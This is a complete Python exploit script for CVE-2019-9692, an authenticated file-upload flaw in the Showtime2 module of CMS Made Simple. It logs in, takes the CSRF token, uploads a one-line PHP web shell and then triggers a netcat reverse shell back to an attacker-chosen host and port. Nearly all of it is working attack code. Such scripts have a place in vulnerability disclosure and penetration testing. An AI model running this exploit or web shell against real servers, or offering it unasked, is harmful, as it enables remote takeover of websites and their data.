# Exploit Title: CMS Made Simple (authenticated) arbitrary file upload in Showtime2 module
# Exploit Author: Daniele Scanu @ Certimeter Group
# Vendor Homepage: https://www.cmsmadesimple.org/
# Software Link: http://viewsvn.cmsmadesimple.org/listing.php?repname=showtime2
# Version: Showtime2 module <= 3.6.2
# Tested on: CMS Made Simple 2.2.8 in Ubuntu 18.04
# CVE : 2019-9692

import requests
import optparse
from requests_toolbelt.multipart.encoder import MultipartEncoder

parser = optparse.OptionParser()
parser.add_option(&#039;-u&#039;, &#039;--url&#039;, action="store", dest="url", help="Base target uri (ex. http://192.168.1.10/cms)")
parser.add_option(&#039;-U&#039;, &#039;--username&#039;, action="store", dest="username", help="Username for login", default="admin")
parser.add_option(&#039;-P&#039;, &#039;--password&#039;, action="store", dest="password", help="Password for login", default="password")
parser.add_option(&#039;-l&#039;, &#039;--local&#039;, action="store", dest="local", help="Local uri for reverse shell", default="localhost")
parser.add_option(&#039;-p&#039;, &#039;--port&#039;, action="store", dest="port", help="Local port for reverse shell", default="2222")
options, args = parser.parse_args()

if not options.url:
    print "[-] Specify an uri target"
    exit()

if not options.username:
    print "[-] Specify an username for login in administrator panel"
    exit()

if not options.password:
    print "[-] Specify a password for login in administrator panel"
    exit()

base_uri = options.url
url_login = base_uri + "/admin/login.php"
user = options.username
password = options.password
session = requests.Session()
__c_var = ""
lhost = options.local
lport = options.port

# Login in administrator panel for get the csrf token
def login(username, password):
    print "[*] Login to cms"
    global __c_var
    credentials = {"username": username, "password": password, "loginsubmit": "Submit"}
    response = session.post(url_login, data=credentials, allow_redirects=False)
    __c_var = response.headers[&#039;Location&#039;].split("__c=")[1]
    print "[*] Token value: " + __c_var

# upload a php script with reverse shell in vulnerable functionality
def upload_shell():
    print "[*] Uploading webshell"
    multipart_data = MultipartEncoder(
        fields = {
            &#039;m1_input_browse&#039;: (&#039;shell.php&#039;, "<?php system($_REQUEST[&#039;cmd&#039;]); ?>", &#039;text/plain&#039;),
            &#039;__c&#039;: __c_var,
            &#039;mact&#039;: &#039;Showtime2,m1_,defaultadmin,0&#039;,
            &#039;m1_upload_submit&#039;: &#039;Upload&#039;
        }
    )
    response = session.post(base_uri + &#039;/admin/moduleinterface.php&#039;, data=multipart_data,
                      headers={&#039;Content-Type&#039;: multipart_data.content_type})

# Call the script uploaded for spawn a reverse shell
def spawn_shell():
    print "[*] Spawn a shell to " + lhost + ":" + str(lport)
    payload = {"cmd": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc " + lhost + " " + str(lport) + " >/tmp/f"}
    requests.post(base_uri + "/uploads/images/shell.php", data=payload)

login(user, password)
upload_shell()
spawn_shell()

